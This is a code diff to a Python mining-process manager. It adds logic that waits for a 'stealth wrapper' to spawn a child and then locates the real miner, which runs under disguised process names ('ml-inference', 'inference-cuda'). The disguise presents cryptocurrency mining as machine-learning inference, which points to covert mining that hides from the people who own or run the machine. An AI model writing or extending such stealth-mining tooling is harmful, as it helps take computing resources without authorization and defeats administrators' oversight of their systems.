@@ -637,11 +637,40 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                 if process:
                     register_mining_process(process_name, process.pid, process)
                     
-                    # Enhanced PID Logger: Đăng ký để monitor runtime output
+                    # Enhanced PID Logger: Detect Real Mining PID (for stealth wrapper case)
                     try:
+                        import psutil
                         process_type = "cpu" if cpu else "gpu"
-                        register_process(process.pid, process_type, process, process_name)
-                        logger.info(f"✅ Registered PID {process.pid} ({process_type}) for enhanced monitoring")
+                        
+                        # Wait for stealth wrapper to spawn child process
+                        time.sleep(2)
+                        
+                        # Find actual mining process by command name
+                        target_cmd = "ml-inference" if cpu else "inference-cuda"
+                        real_mining_pid = None
+                        
+                        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
+                            try:
+                                if proc.info['name'] == target_cmd:
+                                    # Verify it's recent process (started within last 30 seconds)
+                                    proc_obj = psutil.Process(proc.info['pid'])
+                                    if time.time() - proc_obj.create_time() < 30:
+                                        real_mining_pid = proc.info['pid']
+                                        logger.info(f"🔍 Detected real mining PID: {real_mining_pid} for {target_cmd}")
+                                        break
+                            except (psutil.NoSuchProcess, psutil.AccessDenied):
+                                continue
+                        
+                        if real_mining_pid:
+                            # Register real mining process for Enhanced PID Logger
+                            real_process_obj = psutil.Process(real_mining_pid)
+                            register_process(real_mining_pid, process_type, real_process_obj, process_name)
+                            logger.info(f"✅ Enhanced PID Logger registered real mining PID {real_mining_pid} ({process_type})")
+                        else:
+                            # Fallback: register wrapper PID
+                            register_process(process.pid, process_type, process, process_name)
+                            logger.warning(f"⚠️ Could not detect real mining PID, using wrapper PID {process.pid}")
+                            
                     except Exception as _pid_err:
                         logger.warning(f"Enhanced PID logger registration failed: {_pid_err}")
                         # Fallback to legacy log_pid
